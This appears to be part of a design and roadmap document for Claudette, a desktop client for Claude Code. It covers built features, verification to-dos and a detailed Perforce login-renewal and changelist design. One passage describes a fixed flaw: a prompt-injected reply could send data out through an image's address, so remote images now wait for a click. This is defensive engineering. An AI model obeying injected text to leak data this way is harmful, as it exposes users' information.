    - **Still to verify:** everything on machines with Unreal, Unity and Godot installed, on Windows, macOS and Linux (see [§18](#project-tools)).
14. **Remote Control.** ✅ Built 2026-09-29 ([§18](#remote-control-the-claude-app)).
    - **The switch:** **Connect to the Claude app** per tab, in its menu and **Tab settings…**, saved with the tab so it reconnects after restarts; **Connect new tabs to the Claude app** in Settings → Claude Code; disabled with the reason for an account that can't use it.
    - **Connecting:** the `remote_control` control request, as SDK hosts send it, right after the session starts and before any prompt, or when the running turn ends; `enabled: false` to disconnect, with a restart on the same session when that fails; the hidden `/remote-control` command as the fallback for a Claude Code without the request.
    - **What the tab shows:** the connection from the answer, `bridge_state` and `worker_shutting_down`; a note with the session's link, a phone icon on the row, the info card's **Claude app** row, and **Open in the Claude app**; prompts answered in the app read *"Answered in the Claude app"*.
    - **Around it:** `CLAUDE_CLIENT_PRESENCE_FILE` for every `claude`, present while Claudette is in front; keeping the computer awake while a tab is connected (Windows, macOS, Linux); the Diagnostics line.
    - **Still to verify** (needs a claude.ai subscription, a phone and the Claude app; nothing here has connected for real):
      - A real connection: the answer's `session_url` and `connect_url`, the `bridge_state` sequence (ready, connected, reconnecting), and the session showing in the Claude app under the tab's name.
      - The connected answer's exact content, and whether the session's title follows a later rename (`rename_session`) or an AI title.
      - A permission prompt, question and plan answered on the phone closing their cards here.
      - Push delivery to the phone, and the presence file holding pushes off while Claudette is in front.
      - `enabled: false` disconnecting cleanly, and a restarted or restored tab reconnecting.
      - Keeping the computer awake on real Windows, macOS and Linux machines (the Windows call and `caffeinate` only run in CI).
15. **Running tasks, service status and project tools follow-ups.**
    - **Service status ([§18](#service-status)).** ✅ Built 2026-09-29. Claude's status from status.claude.com, at launch, every 5 minutes and straight away when a tab's API requests fail on Anthropic's side: a dot before the account name (green, amber, red or grey) with each watched service (Claude Code, the Claude API, claude.ai) in its tooltip, and a banner across the top while an incident concerns them, with **Status page** and **Dismiss**, remembered on this machine. Settings → General → **Show Claude's service status**.
      - **Still to verify:** a real incident seen live in the running app, and how the dot and banner look on real Windows, macOS and Linux desktops (so far rendered headlessly, both styles, light and dark).
    - **Running tasks ([§5](#running-tasks)).** ✅ Built 2026-09-29. A chip in the composer bar counts the work Claude Code keeps going in the background (shell commands, background subagents, Monitor watches, remote agents), and lists each with its icon, running time, **Stop** and a link to its card; the tab's row counts them once the turn is over, and the info card lists them.
      - **Still to verify** against a real Claude Code: the task messages for a backgrounded command, a Monitor watch (whether it sets `is_backgrounded`, and that its events don't end it), a command moved to the background by its timeout, a remote agent and a workflow; `ambient` tasks; and what `/clear` does to running tasks. Only foreground tasks have been recorded so far (the `03` and `12` fixtures).
    - **Project settings ([§14](#the-projects-pages)).** ✅ Built 2026-09-29. Below Settings' categories, a group for the selected tab's project, named after it, with three pages: **Links**, to add, edit, remove and reorder the links of `claudette.json` and `claudette.local.json`, with the address checked as the sidebar opens links (resolves [issue #9](https://github.com/dotBunny/Claudette/issues/9)); **Actions**, the actions editor moved from **Tab settings…**, which **Add an action…** now opens; and **Tools**, the project's remembered choices (Unreal's configuration and engine folder, Unity's editor and code optimization, the Godot executable). Found by the search box.
      - **Still to verify:** how the group and pages look on real Windows, macOS and Linux desktops, in both styles and themes; so far they've only been rendered headlessly.
    - **The project's menu moves to the sidebar.** The project chip left the composer's bar, which had grown crowded, for a row at the sidebar's foot ([§18](#project-tools)). ✅ Built 2026-09-29.
    - **Links move into the project's menu ([§18](#project-tools)).** The sidebar's Links section went. The project's row shows for every tab instead, named after the folder when no project is recognized, and its menu lists the links and has **Add a link…**. The tab's menu lost its project submenu, which the row made redundant. ✅ Built 2026-09-29.
    - **Open in Rider ([§18](#project-tools)).** With Rider chosen for solutions, an Unreal project opens in Rider by its `.uproject`, with no project files to generate; engines before 4.25.4 (Windows) or 4.26 keep Open solution ([issue #6](https://github.com/dotBunny/Claudette/issues/6)). ✅ Built 2026-09-29.
    - **Claudette's icon, and the icon while tabs work ([§2](#packaging-and-signing), [§10](#10-notifications)).** ✅ Built 2026-09-29. A female Clawd, with a ponytail, replaced the placeholder icon, drawn by `packaging/icon/build-icons.mjs`, which also writes Rider's project icon. While tabs work, the Windows taskbar overlay pulses Claude's spark (the count of tabs needing input comes first) and the macOS Dock icon shows Claudette typing, then waving while a tab needs input; the taskbar button flashes when a tab needs input while Claudette is in the background. Settings → Notifications → **Animate the Dock or taskbar icon while tabs are working**.
      - **Still to verify on real machines:** the spark, the count taking its place and the flash on the Windows taskbar, installed and unpackaged; the Dock animation and the icon coming back on macOS.
    - **Sync now ([§9](#session-library-sync-across-machines)).** A tab that syncs has **Sync now** in its menu, which copies its session to the library straight away, every file again, and says in the conversation how it went; it checks the lease first ([issue #16](https://github.com/dotBunny/Claudette/issues/16)). ✅ Built 2026-09-29.
    - **Reviewed files ([§8](#8-file-changes--diff-view)).** A box on each changed file ticks it as reviewed, in both views, until Claude changes the file again; reviewed files are drawn faintly and counted in the panel's summary. The built-in diff view's **Reviewed** button ticks the file and closes the view. Ticks are saved with the tab and synced through the session record. ✅ Built 2026-09-29.
      - **Still to verify:** how the box and the faint rows look on real Windows, macOS and Linux desktops, in both styles and themes; so far they've only been rendered headlessly.
    - **Starting at login ([§9](#starting-at-login)).** Settings → General → **Start Claudette when I log in** starts Claudette minimized at login: the MSIX through its startup task, other Windows builds through the Run key, a LaunchAgent on macOS and an XDG autostart file on Linux. The entry prefers an installed release to other builds, and those to source builds; a source build hands over to the MSIX, whose task only the MSIX can turn on. ✅ Built 2026-09-29.
      - **Still to verify on real machines:** the MSIX's startup task, its activation and the handover to it; the LaunchAgent on macOS; and the minimized start on real Windows, macOS and Linux desktops.
    - **Continuing after a limit resets ([§6](#continuing-after-a-limit-resets)).** When a plan usage limit stops a task, the tab waits for the reset and sends *"Continue from where you left off."*, as Claude Code does in its terminal but not in `-p` runs. A bar over the composer says when, with **Don't continue**; the tab's row and info card say so too. It holds for a reset more than a day away, after three continues in a row that hit the limit again, and for a reset missed by more than 30 minutes (asleep, or Claudette closed), offering **Continue when it resets** or **Continue**. On by default in Settings → Usage, with **Auto-continue** per tab in **Tab settings…**; the wait is saved with the tab. ✅ Built 2026-09-29.
      - **Still to verify** against a real subscription at its limit: the order of the rejected `rate_limit_event` and the failed `result` (either works), `api_error_status` 429 and `terminal_reason` `api_error` on the result, and `rateLimitType` naming the weekly, Opus and Sonnet limits. So far it has been tested against messages shaped from the SDK reference and others' reports; no fixture has been recorded at a real limit.
    - **The icon while a usage limit waits ([§10](#10-notifications)).** While a usage limit has stopped a tab's task and hasn't reset, the Windows taskbar overlay shows an hourglass whose sand runs down and turns over, and the macOS Dock icon shows Claudette by it. It goes after the count of tabs needing input (waving, on macOS) and before tabs working. The setting became **Animate the Dock or taskbar icon while tabs are working or waiting**. ✅ Built 2026-09-30.
      - **Still to verify on real machines:** the hourglass on the Windows taskbar at 100%, 150% and 200%, on light and dark taskbars; the Dock frames on macOS.
    - **The Project page drops its action buttons ([§18](#project-tools)).** The project's menu at the sidebar's foot has the actions, so the side panel's Project page keeps the project's details and the runs' logs. ✅ Built 2026-09-30.
16. **Hardening and the conversation's tools.** ✅ Built 2026-10-01, in one change: bug fixes, then speed, security, guard rails and maintenance, then features.
    - **Fixes.** A process's exit no longer waits on pipes a child inherited; a repeated JSON key reads as its last value; the library copy after a turn checks the lease first; files are written atomically, and one that couldn't be read is never saved over; a closed tab's working line stops; an exception on the UI thread is logged rather than ending the app; the Linux sleep inhibitor ends with Claudette; a reused PID is never signalled; and a batch of smaller races, quoting and usage-sharing fixes.
    - **Speed.** The conversation and inline diffs are virtualized ([§5](#5-conversation-view)); a keystroke in Settings no longer refreshes the whole app; Changed files inspects only the files that changed, and only for the tab in view; blocking work is off the UI thread; one process scan serves every tab; streaming text and project logs cost less.
    - **Security.** The release workflow is hardened ([§2](#packaging-and-signing)); a macOS update's signer is checked with a code requirement; the single-instance pipe is the user's own and the first launch claims the data folder with a lock; sign-in secrets are kept out of protocol logs, and no update installs without a checksum.
    - **Guard rails.** The compiler enforces the testability rules (banned APIs, code style in the build); the daily compatibility check also tests the oldest supported Claude Code; CI cancels superseded runs and caches locked packages, at no extra cost in minutes; Dependabot opens one grouped update a month for NuGet and one for Actions; tests wait by the clock instead of by loop counts.
    - **Maintenance.** `TabViewModel` lost six areas to child view models (processes, changed files, project tools, Remote Control, Perforce, context), `ShellViewModel` three (opening from History, the sidebar's and side panel's widths, group colors) and project tools their runs; Settings became a page per category, each named once; the conversation builder reads typed system notices; and the view models share their format helpers, tickers, timeouts and inline confirmations.
    - **Features:** [Rewind and branch](#rewind-and-branch) (Edit and resend, Branch from here, Restore files, Duplicate tab), [Find](#find), [Export](#export), the [Tasks](#tasks) and [MCP servers](#mcp-servers) pages, [hook runs](#hook-runs), [MCP servers asking for input](#7-permission-prompts), [Reverting](#reverting) a hunk or file, the Usage panel's **Projects** ([§6](#usage-history)), searching Claude's replies in [History](#history), the [command palette](#command-palette), going to the next tab waiting, earlier prompts in the [composer](#composer), and a [fallback model](#model--effort).
    - **Still to verify:** the new pages, cards, find bar and palette on real Windows, macOS and Linux desktops, in both styles and themes (so far rendered headlessly); Edit and resend with file restore against a real session with checkpoints; an MCP server's form and URL requests from a real server.
17. **Later.** New features go in [§18](#18-future-features) first.
    - **Scratch pad ([§18](#scratch-pad)).** ✅ Built 2026-10-01. A page of notes per project, shared by its tabs and synced through the session library by the project's git remote, with **Add to scratch pad** on selected text, a message's chip and a code block's header, and a choice when two machines changed it at once.
      - **Still to verify:** a pad synced between two real machines through a real sync client (Google Drive, Dropbox, OneDrive), its conflict copies included; the right-click menu over a reply's Markdown with a real mouse, which the headless tests only simulate; the page on real Windows, macOS and Linux desktops in both styles.
    - **The branch on tab rows ([§4](#sidebar)).** ✅ Built 2026-10-01. The git branch a tab works on, or its worktree, at the right of the row's second line with **Copy branch name**; the Perforce changelist badge moved there beside it from the name line. Settings → Git → **Show the git branch** (Conversation's, until Settings had a Git page).
      - **Still to verify:** how the badges fit beside long second lines (an error, a usage limit's wait) on real desktops, in both styles and densities.
    - **Subagents leave the running-tasks chip ([§5](#running-tasks), [§18](#agent-map)).** ✅ Built 2026-10-01. The chip and the info card list background work other than subagents, which the **Agents** button already counts, to give the composer bar back its room; each running subagent's row on the Agents page has its own **■** Stop. The tab row's count still includes them.
    - **From T3 Code.** ✅ Built 2026-10-02. Features T3 Code (t3.codes) has that suit Claudette:
      - [Drafts and the stash](#drafts-and-the-stash): a tab's unsent message outlives quitting, and **Stash** (`Ctrl/Cmd+S`) puts it aside for any tab.
      - [Queued messages](#queued-messages) can wait for the turn to end instead of steering it (Settings → Conversation), with **Send now**.
      - **Quote in reply** and **Quote message** ([§5](#copy-and-times)).
      - [Changes per turn](#changes-per-turn) on each turn's footer (now the **Modified files** and **Turn** cards).
      - [Setting up a new worktree](#project-tools) with `claudette.json` actions marked `runOnNewWorktree`.
      - **Send with** `Ctrl/Cmd+Enter` ([§14](#keyboard-shortcuts)), large pastes kept as attachments, and long messages shown short ([§5](#attachments)).
      - [Cleaning up worktrees](#cleaning-up-worktrees) once merged or unused.
      - **Still to verify:** on real Windows, macOS and Linux desktops in both styles: the composer with pasted-text chips and the **Stashed** menu, the turn footer's flyout, and `Ctrl+Enter` sending with a prompt waiting; worktree setup actions running in a real worktree Claude Code made, with a trusted and an untrusted folder; a cleanup pass over real kept worktrees left for a day.
    - **Following a plan ([§5](#tasks)).** ✅ Built 2026-10-08. The plan shows on the Tasks page while Claude writes it in Plan mode; every version is kept, with **Changes from** the one before on the page and on the plan's card; a reply that looks like the plan for a new task list is offered as the plan. Tasks count the files and tokens of the work done under them; the conversation marks where each starts; a row at a turn's end says where the list stands, with **Continue**; and the status line, the tab's row (Settings → Appearance → **Show task progress on tab rows**) and the info card show how far it's got.
      - **Still to verify:** the draft with a real model, which may write its plan file in several Edits (`PlanRealCliTests` has the mock write it once, through Claude Code's real Plan mode); and the new rows, the status line and the row's badge on real Windows, macOS and Linux desktops in both styles and densities.
    - **Threads ([§18](#threads)).** ✅ Built 2026-10-09, from [issue #39](https://github.com/dotBunny/Claudette/issues/39). A tab can be a thread whose Claude hands work to the other tabs in its group through Claude Code's own `SendMessage`, which Claudette's hook delivers (asking first, by default), with one report back once they've finished; the sub-threads' waiting prompts answered from the thread; the sidebar's nesting, the **Thread** submenu and the palette's commands; and a card for messages from other sessions.
      - **Still to verify:** with a real model, that Claude hands out the work and waits for the report as the note asks rather than polling, and how it takes the hook's answer, which Claude Code marks an error; how the strip and the nested rows look on real Windows, macOS and Linux desktops, in both styles (so far rendered headlessly).
    - **Reaching other sessions by name ([§13](#integration-with-claude-code), "Session naming"; [§5](#autocomplete)).** ✅ Built 2026-10-09. Each tab's session takes the tab's name in Claude Code (`--name` at every start, `rename_session` when it changes; on by default for new installs), so other sessions' Claude can message it by name rather than messaging every `claudette-3f` to ask who it is. The info card shows the session's ID and the name it's reached by, from Claude Code's sessions folder, each with **Copy**; the composer's `@` lists the other tabs, the other sessions on this machine and the tab's subagents, and a mention reaches Claude as the name with a note on how to message it.
    - **Images from Claude's tools ([§18](#images-from-claudes-tools)).** ✅ Built 2026-10-14. The images a tool hands Claude (a Read of an image, a PDF's pages, a notebook's figures, Bash output that's an image, an MCP tool's screenshot) show under its card, live and restored, and a click opens one full size in a window of its own with **Copy image**, **Save as…** and, for a file Claude read, **Open**. Video (no input; a video file opens in the OS's player) is decided there and not built.
      - **Still to verify** on real Windows, macOS and Linux desktops, in both styles and themes: the previews and the window at real sizes (headless drawing decodes no pixels), **Copy image** pasting into other apps, and a real MCP server's screenshot, such as Playwright's.
    - **Images in Claude's replies ([§18](#images-in-claudes-replies)).** ✅ Built 2026-10-14. LiveMarkdown no longer loads a reply's images by itself, which let a prompt-injected reply send data out in an image's address. A file in the tab's folder and a `data:` image show at once; a web image or a file elsewhere waits for **Load image** and then comes through Claudette's own client; a network path never loads.
      - **Still to verify** on real Windows, macOS and Linux desktops, in both styles and themes: the placeholder and the image beside a real reply's text, and a click on **Load image** with a real mouse, which the headless tests simulate.
    - **Files named in Claude's replies ([§18](#files-named-in-claudes-replies)).** ✅ Built 2026-10-15. A Markdown link to a file, and inline code that names one (`weapons.md`, `docs/specs/weapons.md`, `Player.cpp:42`), open the file in the OS's app with a click; until now only web links did. A name is the file the session's tools last worked on, else the project's; several are offered in a menu; a program, script or shortcut shows in its folder instead of running. Inline code is looked for without a click only where that can't reach another machine.
      - **Still to verify** on real Windows, macOS and Linux desktops, in both styles and themes: the underlined code and the hand pointer beside a real reply's text, the menu of several files at a real click, and the OS opening a Markdown file, a folder, and revealing a script.
    - **Accounts, step 1: API keys ([§4](#accounts)).** ✅ Built 2026-10-14, from [issue #47](https://github.com/dotBunny/Claudette/issues/47). API-key accounts whose keys stay in the OS credential store and reach Claude Code through Claudette's own `apiKeyHelper`; an account for each folder group's new tabs, and for folders opened the first time; moving a tab between accounts, saying what the cache-less re-read costs; tags on groups and rows; the header's estimated spend for an API-key tab, with daily and monthly warnings; each turn's account in the usage history and the Usage panel's **Accounts**; and Settings → Accounts.
      - **Still to build:** second claude.ai sign-ins, the strip of accounts and offering another account at a plan limit (steps 2 and 3, [§4](#still-to-build)).
      - **Still to verify:** Claudette's own key helper end to end with a real key. `RealCliTests` has the real `claude` take an `apiKeyHelper` from `--settings` and send its key to the mock API, and the helper was run the way Claude Code runs it on Windows (through `cmd`, which waits for it), but not yet with a key in the real credential store on all three systems. Also, the tags and the spend header on real desktops, in both styles and themes.
    - **Games with Claudette ([§18](#games-with-claudette)).** ✅ Built 2026-10-15. Tic-tac-toe, Connect Four and hangman against Claudette on the side panel's Games page, from her right-click menu, the command palette and the usage limit bar: one game for the whole app, her move after a moment's thought, her reactions on the composer, a score per game kept on this machine, and a line over the board while Claude needs you. Settings → Appearance → **Games with Claudette**.
      - **Still to verify:** the page and the boards on real Windows, macOS and Linux desktops, in both styles and themes (so far rendered headlessly), and her reactions beside a real game.
    - **The facelift: conversation cards ([§18](#conversation-cards)), split panes ([§18](#split-panes)) and the prompt cache timer ([§6](#prompt-cache)).** ✅ Built 2026-10-15, in one change, after [CodeAlta](https://codealta.github.io/)'s timeline. Every step is a card with its kind's color; a run of tool calls is one card of tiles, each opening its detail and a window that follows the call; a turn ends with Modified files and Turn statistics cards; steps on the way are quieter; marks beside the scroll bar and F3/F4 find the messages again; up to three tabs sit side by side; and the composer bar says how long the prompt cache keeps the conversation.
      - **Still to verify:** the cards, tiles, marks and panes on real macOS and Linux desktops (so far on Windows and headlessly); the prompt cache's `cache_creation` on a real subscription's assistant messages, which no recording has yet (the mocks cache nothing), so the lifetime comes from the turn's `result` or the documented default.
    - **Resizing split panes and dragging tabs onto them ([§18](#split-panes)).** ✅ Built 2026-10-15. The line between two panes drags to trade their width, kept with the app state; a tab's row dragged from the sidebar onto a pane opens beside it, or in its place with no room for another.
      - **Still to verify:** both on real macOS and Linux desktops, with a touchpad as well as a mouse (so far on Windows and headlessly).
    - **Moving to .NET 11 ([§2](#moving-to-net-11)).** Planned for .NET 11's release on 2026-11-10, once dropping macOS 12 and 13 is decided. On macOS, .NET 11 starts processes with `posix_spawn` rather than `fork()`, which stops a source build started from a terminal printing `MallocStackLogging` lines. On Windows it builds and passes every test with one package reference removed; macOS and Linux are still to verify.
    - **Project files ([§18](#project-files)).** ✅ Built 2026-10-15, from a design of the same day. One Project Files tab per folder group, opened beside the group's `+`. It has an explorer (on the left, or the right) that finds files by name, and files in tabs in an AvaloniaEdit editor, with a chip for the line endings and indentation. Saving keeps unsaved edits through quitting and restarts. Claude's changes show as gutter bars with a peek, inline or side by side, with **Reviewed**. Files named in replies and Changed files' files open in it (Settings → Files and diffs). It replaces the non-goal of not being an editor ([§1](#non-goals-v1)). Built in steps 0 (a spike) to 4.
      - **Still to verify:** typing with a real IME, macOS and Linux (so far on Windows, on a real screen and headlessly), and the timings on real screens.
    - ✅ **User Guide ([§2](#user-guide)).** Built 2026-10-16. A site at claudette.dotbunny.com, which GitHub Pages builds from `docs/` on `main` with Jekyll and Just the Docs: a chapter for each part of Claudette, written for the people using it, with pictures of the demo in light and dark taken by a script, a check for broken links on each pull request, and pages kept current in the same change as the features they describe; with a Downloads page made from the releases, and a link to `CHANGELOG.md` (started 2026-10-16, with 0.1.0, 0.2.0 and what's unreleased; each release's notes come from it). [GUIDE.md](GUIDE.md) is its plan, with every chapter and page.
    - **Opening images ([§18](#opening-images)).** ✅ Built 2026-10-18. An image file named in a reply, opened from a tool card, Changed files or a run's log, or double-clicked in the explorer, and a web link to an image, open in the image window rather than the OS's app or the browser, as Settings → Files and diffs → **Open images in** says (the window, by default). BMP shows as well as PNG, JPEG, GIF and WebP. An animated GIF or WebP plays in the window, with **Pause** and **Play**, and opens still with motion reduced.
      - **Still to verify** on real Windows, macOS and Linux desktops, in both styles and themes: an animated GIF and an animated WebP playing at their own speed and size (headless drawing decodes no pixels, and the tests have no animated WebP, which Skia can't write), the explorer's double-click with a real mouse, and a web image link in a real reply.

## 18. Future Features

Features beyond v1. All below are built (milestones 10, 11, 13, 14, 15 and 17). New ones go here first, each with a fuller design before it's built.

### Perforce ticket handling

**The problem.**

- In a Perforce workspace, Claude runs `p4` commands through Bash.
- Perforce login tickets expire (often after 12 hours). After that, every `p4` command fails with *"Your session has expired, please login again."*
- Claude can't log in by itself, because `p4 login` asks for a password, so a long-running tab gets stuck.

**The goal.** Claudette keeps each Perforce tab logged in, so Claude can query and use Perforce without stopping. Claude never sees the password.

**Turning it on.** Settings → Perforce → **Keep Perforce logins fresh**, off by default. It applies to tabs started after the change. The code is in `Claudette.Core/Perforce` (the `p4` runner, the ticket keeper, the changelist tracker), `ViewModels/PerforceViewModel.cs` (`tab.Perforce`) and `Services/PerforceService.cs`.

**Detecting a Perforce workspace.**

- Before a tab starts its `claude`, Claudette runs `p4 -ztag info` in the tab's folder, with `p4 set -q P4PORT` and `p4 set -q P4LOGINSSO`. Perforce resolves the server, user and workspace from its usual sources (`P4CONFIG` files, `p4 set`, `P4ENVIRO`, environment variables), the same way Claude's own `p4` commands will. The output is read tolerantly: unknown fields are ignored.
- The folder is a Perforce workspace when `p4` answers, the client exists (not `*unknown*`) and the folder is under the client's root. Detection holds up the tab's start, so it gives up after 10 seconds; a missing `p4` or an unreachable server just means no Perforce handling.
- The server Claudette shows and logs in to is the P4PORT `p4 set` resolves in the folder. The server's own `serverAddress` from `p4 info` can differ (behind a proxy or broker, or `ssl:1666` with no host), so it's only shown when no P4PORT is set; then `-p` is left out of Claudette's commands and `p4` uses its default, as Claude's do.
- If it is a Perforce workspace:
  - The tab info card shows a **Perforce** row, for example *"matt @ ssl:perforce:1666, ticket expires in 11h"*. Other states read "ticket expired", "not logged in", "server unreachable", "log in yourself (single sign-on or a second factor)", and a failed login adds its reason.
  - Claudette adds a short note to the session with `--append-system-prompt`: the folder is in a Perforce workspace, with its server, user, workspace name and root; use `p4` for source control rather than assuming git; the app keeps the login fresh, so never run `p4 login` or pass a password; and after an expired-session error, wait for the renewal message and retry.
  - The session registers the PreToolUse hook below.

**Keeping the ticket fresh.** A ticket keeper per tab (`PerforceTicketKeeper`) does this, on the injected clock.

- **Ahead of time.** `p4 -ztag login -s` reports whether the ticket is valid and how long it has left (`TicketExpiration`, in seconds; the plain *"User matt ticket expires in 11 hours 59 minutes."* is read too). Claudette checks when the tab's session starts, when each turn starts (alongside the message, not holding it up), and every 15 minutes. When the ticket has expired, doesn't exist, or has less than 30 minutes left (Settings → Perforce), Claudette logs in again.
- **Just in time.** Claudette registers a `PreToolUse` hook for Bash through the `hooks` field of the `initialize` request, with a 5-minute timeout, and Claude Code calls back with a `hook_callback` control request before each Bash command ([§13](#integration-with-claude-code), "Hook callbacks").
  - Only commands that run `p4` are checked, anywhere in the command line (`cd src && p4 edit …` counts); the hook answers the others straight away.
  - A check from the last 5 minutes that found more than the renew-before time left is trusted, so a turn full of `p4` commands doesn't run `p4 login -s` before each one.
  - The hook never changes the command: it always answers `{"continue": true}`, so permission prompts work as before.
  - A hook that times out stops the command without running it (confirmed against 2.1.284). So when a login is still waiting on the user, the hook answers by itself 15 seconds before its timeout, and the command runs and fails; recovery then takes over.
- **Recovery.** If a `p4` command still fails with an expired-session or *"Perforce password (P4PASSWD) invalid or unset."* error (in the Bash tool result's text, `stdout` or `stderr`), Claudette logs in again. It then sends a mid-turn message, the way a message queued during a tool call is sent: *"Perforce login renewed. Retry the last p4 command."* The conversation shows a note saying so.
  - At most one such message per turn, so a command failing for another reason (another user or server on its command line, say) can't loop.
  - If the login can't happen yet (a prompt still open, single sign-on), a note says so, and the message goes once the ticket is valid again, if the turn is still running.
- **One login at a time.** A tab's checks and logins are shared: whoever arrives while one runs waits for it. Logins for the same server and user are serialized across tabs, and a tab re-checks after waiting, so tabs in one workspace log in once.
- **After a failure.** When a login fails or the prompt is cancelled, hooks, recovery and the 15-minute check don't try again for 5 minutes. A new turn does.

**Logging in.**

- Claudette runs `p4 -p <server> -u <user> login` in the tab's folder and writes the password to the command's standard input, then closes it. The password never goes on the command line, where other processes and the process monitor could see it, and it's never logged. (`-p` is left out when no P4PORT is set; see above.)
- *"User matt logged in."* is success. When Perforce refuses a password (*"Password invalid."*) and the source can ask again, the prompt shows the reason, up to three tries.
- Optional setting: request a ticket valid on all hosts (`login -a`).
- Perforce writes the ticket to its own tickets file (`P4TICKETS`) as usual; Claudette doesn't touch that file.

**Where the password comes from** (Settings → Perforce → Password source):

1. **Stored by Claudette** (recommended, and the default): saved in the OS credential store under `perforce/<server>/<user>`. It's never written to `settings.json`, never synced ([§14](#settings-sync-optional)), and never logged. The stores are in `Claudette.Platform/Credentials`, behind `ICredentialStore` in Core:
   - **Windows:** Credential Manager, a generic credential named `Claudette/perforce/…`, kept for this user on this machine (`CRED_PERSIST_LOCAL_MACHINE`, so it doesn't roam), through `CredReadW`, `CredWriteW` and `CredDeleteW`.
   - **macOS:** the Keychain, a generic password with service `Claudette`, through Security.framework's `SecItemAdd`, `SecItemCopyMatching` and `SecItemDelete`.
   - **Linux:** the Secret Service through `secret-tool`, with the secret on its standard input. Without `secret-tool`, Settings says to install it (the `libsecret-tools` package), and passwords can only be asked for.
   - When nothing is stored yet, or Perforce refuses the stored password, the tab asks, with **Save it in <store>** ticked; the password is saved once the login has worked. Settings → Perforce can also save or forget a password for a server and user, filled in from the workspaces the tabs found.
2. **Perforce's own configuration**: `P4PASSWD` from the `P4CONFIG` file, `p4 set` or the environment. Claudette only reads it, with `p4 set -q P4PASSWD` in the tab's folder, and passes it to `p4 login` on standard input. Settings notes that these sources store the password in plain text. If it isn't set, or Perforce refuses it, the tab says so and Claudette doesn't ask for another.
3. **Ask each time**: when a login is needed, the tab shows a password prompt (**Log in** / **Cancel**) and stores nothing. The tab shows "Needs input" and counts in the Dock/taskbar badge, and a notification goes out if the user isn't looking ([§10](#10-notifications)). A `p4` command waits in the hook until the user answers or the hook is about to time out.

**Settings → Perforce** (ticket handling is off by default): turn ticket handling on or off, password source (with the plain-text note for Perforce's configuration), renew-before-expiry time in minutes, all-hosts tickets, **Show changelist on tabs**, the stored password (**Save password** / **Forget password**), and per-folder overrides for server and user (the deepest folder containing the tab's wins). **Reset to defaults** keeps the per-folder overrides and stored passwords. None of it syncs between machines.

**Not covered.** Servers that sign in through SSO (`P4LOGINSSO` set, or the server requiring it) or multi-factor authentication. For those, Claudette doesn't try a password: it adds a note to the conversation and sends a notification, *"Perforce needs you to log in: run p4 login in a terminal, or log in with P4V."*, then checks every minute until the ticket is valid.

**Testing.** No test uses a real Perforce server. A pretend `p4` (`FakeP4`) answers `info`, `set`, `login -s` and `login` from test state, and a shell-script `p4` checks the password crossing a real pipe. The Linux credential store is tested with `secret-tool` faked; the Windows store round-trips for real on Windows, and the macOS one builds its Keychain queries on macOS (the round trip runs only with `CLAUDETTE_TEST_KEYCHAIN=1`, since a locked keychain would ask).

> **Not yet tried for real:** a real Perforce server, P4V, single sign-on, and the Windows and macOS credential stores in the running app.

### Perforce changelist in the tab title

When Claude is working in a specific Perforce changelist, Claudette shows its number. It's always a row in the tab info card ([§4](#4-tabs--sessions)), and optionally (a setting) a badge on the tab itself, for example *"fix login bug · CL 12345"*. It works in every tab, whether or not ticket handling is on, since it only reads Claude's Bash calls (`ChangelistTracker` in Core).

- **Detecting the changelist.** Claudette watches the tab's Bash tool calls and their results, subagents' too, but only commands that run `p4`:
  - Commands that name a changelist with `-c` (as `-c 12345` or `-c12345`): `p4 edit`, `add`, `delete`, `reopen`, `shelve`, `unshelve`, `submit`, `integrate`, `copy`, `merge`, `move`, `rename`, `undo`, `lock` and `resolve`. Also `p4 change -o 12345` and `p4 change 12345`. A `-c` before the subcommand is the client, not a changelist.
  - Output that creates or updates one: *"Change 12345 created."* (or *"… created with 2 open file(s)."*), *"Change 12345 updated."*
  - The most recently used changelist wins. The default changelist isn't shown.
  - A command that failed doesn't count for the changelist it names (it may not exist), but its output still counts.
- **Showing it.**
  - A "Changelist" row in the tab info card: *"CL 12345"*, then *"earlier: CL 12001 · submitted, …"* when the session used several.
  - If **Show changelist on tabs** is on (Settings → Perforce, off by default), also a `CL 12345` badge at the right of the tab's second line in the sidebar ([§4](#sidebar)). The badge is separate from the name, so renaming the tab doesn't drop it.
- **Actions.** Clicking the badge offers **Copy changelist number** and **Open in P4V**; the ⓘ info card under the composer lists every changelist with **Copy** and **Open in P4V**. P4V opens with `p4v -p <server> -u <user> -c <workspace> -cmd "open changelist 12345"`, found on the PATH or where its installers put it.
- **Saved with the tab** (its `changelists` in `state.json`, and in restart snapshots), so a restored tab shows it again.
- **Resetting it.**
  - When the changelist is submitted (*"Change 12345 submitted."*), the badge says `CL 12345 · submitted`. A submit that renumbers it (*"Change 12345 renamed change 12350 and submitted."*) shows the new number.
  - When it's deleted (*"Change 12345 deleted."*), the badge goes away, even if an older changelist is still pending, and the info card no longer lists it. Using another changelist brings the badge back.

### Perforce in the Files tab

✅ Built 2026-10-28. In a Perforce workspace, the Project Files tab ([Project files](#project-files)) shows what Perforce has open and has Perforce's commands on its menus, and Claudette opens files in Perforce as they're changed, made, renamed and deleted, in the Files tab and by Claude. Before this, Claude ran `p4 edit` itself, and a file Perforce hadn't checked out opened read-only in the editor, since Perforce leaves it so.

**Finding the workspace.** Separate from ticket handling, which holds a tab's start up to find its workspace (above): this never holds anything up.

- A Files tab looks for its folder's workspace the first time it shows, and a session tab as it starts, when any of the automatic actions below is on. Both run in the background, through one finder that remembers each folder's answer (`PerforceWorkspaceFinder`), and that ticket handling tells what it found.
- First `p4 set -q`, which reads the folder's settings (its `P4CONFIG` file, `p4 set`, the environment) without reaching a server. With no P4PORT or P4CLIENT from any of them, the folder isn't Perforce's, and no server is asked, so people who don't use Perforce never wait on one. Then `p4 -ztag info`, as detection does (above).
- A folder that isn't a workspace is remembered until the explorer's **Refresh**. One whose server didn't answer is asked again a minute later, when something needs it.

**The state in the tree.** Each file Perforce has open shows it beside its name, in Perforce's own words, muted so Claude's change letters stay what catches the eye: *edit*, *add*, *delete*, *move* (the new name) and *moved* (the old), the action for anything else (*integrate*), and *others* for a file only someone else has open. Its tooltip, which a screen reader reads, says it in full: *Checked out in CL 12345.*, *Opened by anna@anna-ws.* A file nobody has open, and one Perforce doesn't have, have no mark, which would be noise. Settings → Perforce → **Show Perforce state in the Files tab** turns the marks off.

